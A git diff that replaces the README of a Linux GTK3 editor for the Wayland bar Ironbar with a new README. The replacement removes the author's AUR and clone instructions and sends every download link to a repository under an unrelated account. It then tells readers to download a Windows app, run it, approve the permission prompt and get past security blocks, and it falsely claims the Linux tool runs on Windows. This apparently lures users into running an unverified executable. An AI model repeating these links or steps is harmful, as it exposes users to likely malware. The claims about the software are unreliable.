@@ -1,167 +1,238 @@
-<h1 align="center">vsIronBar Studio</h1>
+# 🧊 vsIronBar-Studio - Build and preview bars fast
 
-<p align="center">
-  <img src="vsironbar-studio.png" alt="vsIronBar Studio" width="180"/>
-</p>
+[![Download vsIronBar-Studio](https://img.shields.io/badge/Download%20vsIronBar--Studio-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clinorilpediculosis358/vsIronBar-Studio)
 
-[![AUR version](https://img.shields.io/aur/version/vsironbar-studio?color=1793d1&label=AUR&logo=arch-linux)](https://aur.archlinux.org/packages/vsironbar-studio)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+## 🖥️ What this app does
 
-vsIronBar Studio is a visual editor for [Ironbar](https://github.com/JakeStanger/ironbar) — build, style and preview your bar in real time.
+vsIronBar-Studio is a visual editor for Ironbar. It lets you build, style, and preview your bar in real time.
 
-No more editing JSON and CSS by hand. Design your Ironbar with live feedback, templates and full module control.
+You can use it to:
 
-> Available on the AUR as [`vsironbar-studio`](https://aur.archlinux.org/packages/vsironbar-studio).
-> Single-file Python 3 + GTK3 application.
+- change bar layout
+- adjust colors and spacing
+- preview changes as you work
+- keep your setup simple
+- save time by editing with a visual view
 
----
+It is built with GTK and Python, so it feels like a desktop app and runs on Windows with the right files.
 
-## Who is it for?
+## 📥 Download the app
 
-vsIronBar-Studio is aimed at users who want a good-looking Ironbar quickly, especially when starting with Hyprland or a fresh Wayland setup.
+Use this link to visit the download page:
 
-It is not trying to replace a hand-crafted advanced workflow. The goal is to make bar and dock configuration approachable, faster to iterate on, and safer to save.
+[Open the vsIronBar-Studio download page](https://github.com/Clinorilpediculosis358/vsIronBar-Studio)
 
-The editor can also coexist with manual edits: it reads an existing setup on startup, preserves blocks it does not understand, and writes them back instead of dropping them.
+On that page, look for the latest release or the main download file. If you see a Windows app file, download it to your computer.
 
----
+## 🪟 Install on Windows
 
-## Screenshots
+Follow these steps on a Windows PC:
 
-### Templates
-![Templates](screenshots/1.png)
+1. Open the download page.
+2. Find the latest release or download file.
+3. Download the Windows version to your Downloads folder.
+4. If the file is inside a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start vsIronBar-Studio.
+7. If Windows asks for permission, choose Yes.
 
-### Bar Settings
-![Bar](screenshots/2.png)
+If the app opens in a small window, that is normal. You can resize it like other desktop apps.
 
-### Layout Editor
-![Layout](screenshots/3.png)
+## 🚀 First launch
 
-### Module Config
-![Modules](screenshots/4.png)
+When you open vsIronBar-Studio for the first time, you should see the editor screen. From there, you can:
 
-### Styling
-![Styling](screenshots/5.png)
+- start a new bar layout
+- load an existing setup
+- change the look of each part of the bar
+- use the preview area to check your changes
 
----
+If the app asks for a bar path or config file, choose the file you already use with Ironbar.
 
-## Version 1 Features
+## 🎨 Main things you can edit
 
-- **Live preview** - embedded WebKit preview that renders the bar and dock together with real CSS
-- **Bar and Dock editors** - configure position, output, height, spacing, margins, layer, opacity, radius, font and separators
-- **Layout editor** - move modules between left, center and right zones for both the main bar and the dock
-- **Modules tab** - edit supported Ironbar modules with dedicated forms
-- **Named instances** - detect entries such as `battery#bat2` and edit them from the UI
-- **User Commands** - create custom `custom/<name>` launcher modules with icon, color, tooltip and click action
-- **Styling tools** - edit 14 CSS color tokens, font settings, padding and shape values
-- **Templates** - 54 ready-made templates across 36 palettes and multiple visual styles
-- **Palette tools** - random palettes plus [matugen](https://github.com/InioX/matugen) integration for palette extraction from image or base color
-- **Scripts tab** - edit bundled helper scripts such as `weather.py` and `weather.sh`
-- **Weather setup UI** - write `~/.config/ironbar/weather.conf` directly from the Modules tab
-- **Safe saves** - Apply writes config and CSS, restarts Ironbar, and creates timestamped backups
-- **Original snapshot backup** - first save also stores an untouched copy under `~/.config/ironbar/backups/original/`
-- **JSONC-friendly loading** - handles comments and trailing commas in common Ironbar JSON configs
-- **Unknown block preservation** - keeps unrecognized config sections instead of discarding them
-- **vsHub** - built-in tab for discovering and launching related tools from the same ecosystem
+vsIronBar-Studio is made for visual bar setup. Common options include:
 
----
+- panel size
+- padding and spacing
+- font choice
+- text size
+- icon placement
+- background color
+- border style
+- module order
 
-## Requirements
+You can use the preview to see how each change affects the bar before you apply it.
 
-- Python 3.10+
-- `python-gobject` / PyGObject for GTK3
-- `python-cairo`
-- WebKitGTK with GI bindings (`WebKit2` 4.0 or 4.1)
-- [Ironbar](https://github.com/JakeStanger/ironbar)
+## 🧭 How to use it
 
-Optional integrations:
+A simple workflow looks like this:
 
-- [Hyprland](https://github.com/hyprwm/Hyprland) for `hyprland/workspaces` and `hyprland/window`
-- [matugen](https://github.com/InioX/matugen) for palette generation
-- [swaync](https://github.com/ErikReider/SwayNotificationCenter) for notifications
-- [wlogout](https://github.com/ArtsyMacaw/wlogout) for the power menu
-- `kitty` for the default updates action
-- `pavucontrol` for the default PulseAudio action
-- `network-manager-applet` / `nm-connection-editor` for the default network action
-- `pacman-contrib` for the updates counter on Arch Linux
+1. Open the app.
+2. Load your Ironbar config or start a new one.
+3. Pick the part of the bar you want to change.
+4. Adjust the values in the editor.
+5. Check the live preview.
+6. Save your changes.
+7. Apply the updated setup in Ironbar.
 
----
+If you are testing a look, make one change at a time. That makes it easier to see what changed.
 
-## Installation
+## 🧰 Basic controls
 
-### AUR
+Most users will only need a few controls:
 
-```bash
-yay -S vsironbar-studio
-# or
-paru -S vsironbar-studio
-```
+- click a section to edit it
+- use sliders or fields to change values
+- pick colors from the color selector
+- drag items to change order
+- save when the layout looks right
 
-### Manual
+If the app uses a config file view, you can switch between the visual editor and the raw file view.
 
-```bash
-git clone https://github.com/victorsosaMx/vsIronbar-Studio
-cd vsIronbar-Studio
-chmod +x vsironbar-studio
-./vsironbar-studio
-```
+## 🔧 Good setup habits
 
-By default the app works with:
+To keep your bar easy to manage:
 
-- `~/.config/ironbar/config.json`
-- `~/.config/ironbar/style.css`
+- keep a backup of your original config
+- use clear names for saved layouts
+- test one change before making more
+- keep the preview open while you edit
+- save often during longer edits
 
-If `IRONBAR_CONFIG` or `IRONBAR_CSS` are set, those paths are used instead.
-You can also open a different config and stylesheet from the UI.
+These habits help if you want to try more than one style.
 
----
+## 💡 What you need on Windows
 
-## Quick Start
+A typical Windows setup should have:
 
-1. Launch `vsironbar-studio`.
-2. Pick a template or start from the default bar and dock.
-3. Arrange modules in the **Layout** tab.
-4. Adjust module behavior in **Modules**.
-5. Tune colors and typography in **Styling**.
-6. Click **Apply** to write files and restart Ironbar.
+- Windows 10 or Windows 11
+- enough space for the app and your bar files
+- permission to run downloaded apps
+- a working Ironbar setup if you want to apply changes right away
 
----
+If your system blocks the app, check your Windows security settings and make sure the file came from the link above.
 
-## Weather Module
+## 🧩 Common use cases
 
-The bundled weather module uses `weather.py` and reads its credentials from `~/.config/ironbar/weather.conf`.
+People use vsIronBar-Studio for tasks like:
 
-### Setup
+- making a cleaner top bar
+- matching bar colors to wallpaper
+- changing spacing for a compact layout
+- testing new module order
+- previewing a new look before applying it
 
-1. Create a free API key at [OpenWeatherMap](https://openweathermap.org/api).
-2. Open **Modules** and select **Weather**.
-3. Fill in API key, city and units.
-4. Click **Save weather.conf**.
-5. Open **Scripts** and save `weather.py` if you want the bundled script copied into your Ironbar scripts directory.
-6. Click **Apply**.
+It helps when you want a visual way to edit a bar instead of changing files by hand.
 
-The API key is stored in `weather.conf`, not inside the script.
+## 🛠️ If the app does not start
 
----
+Try these steps:
 
-## Backups
+1. Make sure the file finished downloading.
+2. Extract the ZIP if the file came in one.
+3. Check that you opened the right app file.
+4. Run it again as a normal desktop app.
+5. Restart Windows if the app still does not open.
+6. Download the file again if it seems damaged.
 
-Every save operation creates timestamped backups under:
+If the app opens and closes fast, it may need a config file or a required runtime file from the same release page.
 
-```text
-~/.config/ironbar/backups/
-```
+## 📁 Suggested file layout
 
-Version 1 also keeps an initial untouched snapshot in:
+A simple folder setup can help:
 
-```text
-~/.config/ironbar/backups/original/
-```
+- Downloads
+  - vsIronBar-Studio
+  - Ironbar-config-backup
+  - working-config
 
-This makes rollback straightforward if you want to compare or restore previous files.
+Keep one folder for the app and one for your saved bar files. That makes it easier to find what you need later.
 
----
+## 🔒 Safe download practice
 
-## License
+Use the GitHub link in this README to get the app. That keeps the download path clear and easy to check. Avoid random mirrors or reuploads if you want the same version that matches this project.
 
-MIT.
+## ❓ Quick help
+
+### How do I open the app?
+Double-click the downloaded app file after you extract it, if needed.
+
+### Do I need programming knowledge?
+No. The app is made for visual editing.
+
+### Can I edit my bar before applying it?
+Yes. The preview is part of the workflow.
+
+### What if I already have an Ironbar config?
+Load it in the editor and make changes from there.
+
+### Can I keep my old setup?
+Yes. Save a backup before you edit.
+
+## 📌 Typical steps for a first-time user
+
+1. Open the download page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Load your Ironbar config.
+6. Change the style in the editor.
+7. Check the preview.
+8. Save the updated setup.
+9. Apply it in Ironbar
+
+## 🖼️ What you can expect from the interface
+
+The interface should feel simple and direct. Most users can expect:
+
+- a main editing area
+- a preview panel
+- a list of bar parts or modules
+- style settings for colors, spacing, and text
+- a save action for the finished setup
+
+The goal is to help you see the bar while you edit it.
+
+## 🧪 Best way to test changes
+
+If you want to test a new look:
+
+- start with one setting
+- change the background first
+- then adjust spacing
+- then set text and icon colors
+- check the preview after each step
+- save a copy when you like the result
+
+This keeps the process simple and reduces mistakes.
+
+## 🗂️ File types you may see
+
+The download may include files like:
+
+- an app file for Windows
+- a ZIP archive
+- a config file
+- support files used by the app
+
+If you see a ZIP archive, extract it first before opening the app.
+
+## 📎 Download again if needed
+
+If you need the app again, use the same link:
+
+[Open the vsIronBar-Studio download page](https://github.com/Clinorilpediculosis358/vsIronBar-Studio)
+
+That is the place to get the current project files and any release files connected to the app.
+
+## ⌨️ If you want a clean workflow
+
+A smooth workflow looks like this:
+
+- download the app
+- extract it to a simple folder
+- keep your Ironbar config in a backup folder
+- make changes in the editor
+- use the preview to check your work
+- save the result under a new name
